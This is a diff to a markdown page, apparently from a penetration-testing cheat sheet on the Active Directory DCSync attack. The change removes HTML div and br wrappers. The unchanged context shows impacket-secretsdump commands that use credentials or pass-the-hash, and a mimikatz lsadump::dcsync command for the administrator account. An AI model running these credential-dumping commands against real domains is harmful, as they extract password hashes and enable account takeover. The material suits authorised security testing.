@@ -10,8 +10,6 @@ tags: ["GetChanges", "GetChangesAll", "dcsync", "secretsdump", "active driectory
 {{< tab set1 tab2 >}}Windows{{< /tab >}}
 {{< tabcontent set1 tab1 >}}
 
-<div>
-
 ```console
 # With creds
 impacket-secretsdump -just-dc '<USER>:<PASSWORD>@<TARGET>'
@@ -22,19 +20,11 @@ impacket-secretsdump -just-dc '<USER>:<PASSWORD>@<TARGET>'
 impacket-secretsdump -hashes <HASH> -just-dc '<DOMAIN>/<USER>@<TARGET>'
 ```
 
-</div>
-
 {{< /tabcontent >}}
 {{< tabcontent set1 tab2 >}}
-
-<div>
 
 ```console
 .\mimikatz.exe 'lsadump::dcsync /domain:<DOMAIN> /user:administrator' exit
 ```
 
-</div>
-
 {{< /tabcontent >}}
-
-<br>
